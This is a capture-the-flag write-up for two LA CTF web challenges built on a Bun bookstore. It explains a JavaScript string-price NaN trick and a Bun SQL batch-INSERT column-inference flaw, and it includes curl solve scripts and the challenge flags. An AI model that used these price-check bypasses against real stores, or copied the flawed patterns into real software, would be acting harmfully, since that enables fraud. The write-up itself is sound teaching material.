---
title: "Narnes and Bobles & Bobles and Narnes"
date: 2026-02-08
tags: ["bun", "type-confusion", "javascript", "sqlite"]
topics: ["web"]
summary: "Two type confusion bugs in a Bun bookstore: string price NaN trick, then batch INSERT column inference."
releaseDate: "2026-02-09"
ctfs: ["lactf-26"]
difficulty: medium
draft: false
---

> I heard Amazon killed a certain book store so I'm gonna make my own book store and kill Amazon.  
> I dove deep and delivered results.

> The bobler

---

Two challenges, same bookstore. You start with $1000 and need to buy a flag that costs $1,000,000. The original "Narnes and Bobles" had a type confusion bug in a book price (string instead of number). The revenge "Bobles and Narnes" fixes that specific bug, but the same codebase has a second, subtler flaw: Bun SQL's `db()` helper infers INSERT columns from the *first* object in a batch, silently dropping keys that only appear in later objects.

---

## The application

The server is a Bun + Express bookstore backed by an in-memory SQLite database. Users register, get a $1000 balance, and can add books to their cart and check out. The checkout endpoint zips up the purchased files and sends them as a download.

Four books are available:

| Book | Price |
|---|---|
| The Part-Time Parliament | $10 |
| The End of Cryptography | $20 |
| AVDestroyer Origin Lore | $40 |
| Flag | $1,000,000 |

Each book has a "sample" variant (a preview file) and the full version. Sample items are free; full items cost their listed price.

The cart table stores items with three columns:

```sql
CREATE TABLE cart_items (
  username TEXT,
  book_id TEXT,
  is_sample INT,
  ...
);
```

---

## The price check

When adding products to the cart, `/cart/add` performs a balance check. This is the critical code path:

```js
app.post('/cart/add', needsAuth, async (req, res) => {
  const productsToAdd = req.body.products;

  const [{ balance }] = await db`SELECT balance FROM users WHERE username=${res.locals.username}`;
  const [{ cartSum }] = await db`
    SELECT SUM(books.price) AS cartSum
    FROM cart_items
    JOIN books ON books.id = cart_items.book_id
    WHERE cart_items.username = ${res.locals.username} AND cart_items.is_sample = 0
  `;

  const additionalSum = productsToAdd
    .filter((product) => !+product.is_sample)
    .map((product) => booksLookup.get(product.book_id).price ?? 99999999)
    .reduce((l, r) => l + r, 0);

  if (additionalSum + cartSum > balance) {
    return res.json({ err: 'too poor, have you considered geting more money?' })
  }

  const cartEntries = productsToAdd.map((prod) => ({ ...prod, username: res.locals.username }));
  await db`INSERT INTO cart_items ${db(cartEntries)}`;
  // ...
});
```

The check works in two parts:
1. **SQL sum**: tallies prices of non-sample items *already in the cart* (`WHERE is_sample = 0`)
2. **JS sum**: tallies prices of non-sample items *being added now* (`.filter((product) => !+product.is_sample)`)

If the total exceeds the user's balance, the request is rejected. Otherwise, the products are inserted into the database.

---

## How checkout determines which file to serve

At checkout, the server reads each cart item and decides whether to serve the full file or the sample:

```js
const path = item.is_sample ? book.file.replace(/\.([^.]+)$/, '_sample.$1') : book.file;
const content = await Bun.file('books/' + path).bytes();
```

If `is_sample` is truthy, you get `flag_sample.txt`. If falsy, you get `flag.txt` (the real flag). Importantly, checkout has **no price validation**. It just deducts from your balance (which can go negative) and serves the files.

So the goal is clear: get the flag book into your cart with `is_sample` stored as a falsy value in the database, while somehow passing the price check during add.

---

## The original bug (narnes-and-bobles)

In the original challenge, the first book's price in `books.json` was a *string*:

```json
{ "id": "a3e33c2505a19d18", "title": "The Part-Time Parliament", "price": "10" }
```

All other prices were numbers. This created a type confusion in the `reduce` operation.

When you add both the Parliament book and the flag in one request, the reduce processes them left to right with initial value `0`:

```
Step 1: 0 + "10"      = "010"         (number + string = string concatenation!)
Step 2: "010" + 1000000 = "0101000000"  (still concatenating)
```

Now `additionalSum` is the string `"0101000000"`. The balance check becomes:

```js
"0101000000" + null > 1000
// "0101000000null" > 1000
// NaN > 1000
// false  <-- check passes!
```

The string can't be parsed as a number, so JavaScript coerces it to `NaN`. And `NaN > anything` is always `false`. The price check silently passes for any amount.

### Solve (narnes-and-bobles)

```sh
TARGET="https://narnes-and-bobles-XXXXX.instancer.lac.tf"
USER="solve_$(date +%s)"

curl -s -c /tmp/cookies.txt -X POST "$TARGET/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=${USER}&password=pass"

# Parliament (string price) first, then flag -- order matters for reduce
curl -s -b /tmp/cookies.txt -X POST "$TARGET/cart/add" \
  -H "Content-Type: application/json" \
  -d '{"products": [{"book_id": "a3e33c2505a19d18", "is_sample": 0}, {"book_id": "2a16e349fb9045fa", "is_sample": 0}]}'

curl -s -b /tmp/cookies.txt -X POST "$TARGET/cart/checkout" -o /tmp/solve.zip
unzip -p /tmp/solve.zip flag.txt
```

---

## What the revenge changed

The fix is exactly one line. In `books.json`:

```diff
-    "price": "10"
+    "price": 10
```

The string price becomes a proper number. Now the reduce always produces a numeric sum, and the `NaN` trick no longer works. The flag's price of 1,000,000 correctly exceeds the $1000 balance, and the check rejects it.

Everything else in the codebase is identical (aside from some debug `console.log` statements).

---

## Finding the new bug

The insert at the end of `/cart/add` uses Bun SQL's tagged template helper:

```js
const cartEntries = productsToAdd.map((prod) => ({ ...prod, username: res.locals.username }));
await db`INSERT INTO cart_items ${db(cartEntries)}`;
```

The `db(cartEntries)` call takes an array of objects and generates a batch INSERT statement. To do this, it needs to decide which columns to include. Bun's implementation infers the column list from the **keys of the first object in the array**.

This means: if the first object is `{ book_id: "abc", username: "me" }` (no `is_sample` key), the generated SQL is:

```sql
INSERT INTO cart_items (book_id, username) VALUES (?, ?), (?, ?)
```

The `is_sample` column is simply absent from the INSERT. SQLite fills it with NULL for *every* row, regardless of whether later objects in the array had an `is_sample` property.

But here's the critical part: the price check runs on the **raw JavaScript objects** from `req.body.products`, *before* the INSERT. The JS filter uses `!+product.is_sample`, which reads the `is_sample` property directly from each object.

So we have a mismatch:
- **JS price check**: sees the raw `is_sample` value from user input (per object)
- **Database INSERT**: only uses columns from the first object, dropping `is_sample` entirely if the first object doesn't have it

---

## The exploit

Send two products in a single `/cart/add` request:

```json
{
  "products": [
    { "book_id": "a3e33c2505a19d18" },
    { "book_id": "2a16e349fb9045fa", "is_sample": 1 }
  ]
}
```

The first product (Parliament, $10) has **no `is_sample` key**. The second product (Flag) has `is_sample: 1`.

### What happens at add time (JS)

The filter `.filter((product) => !+product.is_sample)` runs on each raw object:

1. Parliament: `product.is_sample` is `undefined` (key missing). `+undefined = NaN`. `!NaN = true`. Kept as non-sample. Price = $10.
2. Flag: `product.is_sample` is `1`. `+1 = 1`. `!1 = false`. Filtered out (treated as sample, not counted).

`additionalSum = 10`. The balance check: `10 + null <= 1000`. Passes.

### What happens at insert time (Bun SQL)

`db()` sees the first object's keys: `{ book_id, username }`. No `is_sample`. The INSERT becomes:

```sql
INSERT INTO cart_items (book_id, username) VALUES ('a3e3...', 'me'), ('2a16...', 'me')
```

Both rows get `is_sample = NULL`.

### What happens at checkout

```js
const path = item.is_sample ? book.file.replace(/\.([^.]+)$/, '_sample.$1') : book.file;
```

`item.is_sample` is `NULL`, which JavaScript reads as `null`. `null` is falsy. The ternary takes the else branch: `book.file = "flag.txt"`. We get the full flag file.

The balance goes negative (`1000 - 1000010 = -999010`), but there's no check preventing that at checkout.

---

### Solve (bobles-and-narnes)

```sh
TARGET="https://bobles-and-narnes-XXXXX.instancer.lac.tf"
USER="solve_$(date +%s)"

# Register
curl -s -c /tmp/cookies.txt -X POST "$TARGET/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=${USER}&password=pass"

# Add flag to cart (first product missing is_sample key)
curl -s -b /tmp/cookies.txt -X POST "$TARGET/cart/add" \
  -H "Content-Type: application/json" \
  -d '{"products": [{"book_id": "a3e33c2505a19d18"}, {"book_id": "2a16e349fb9045fa", "is_sample": 1}]}'

# Checkout and extract flag
curl -s -b /tmp/cookies.txt -X POST "$TARGET/cart/checkout" -o /tmp/solve.zip
unzip -p /tmp/solve.zip flag.txt
```

---

## Flags

Narnes and Bobles:
```
lactf{matcha_dubai_chocolate_labubu}
```

Bobles and Narnes:
```
lactf{hojicha_chocolate_dubai_labubu}
```
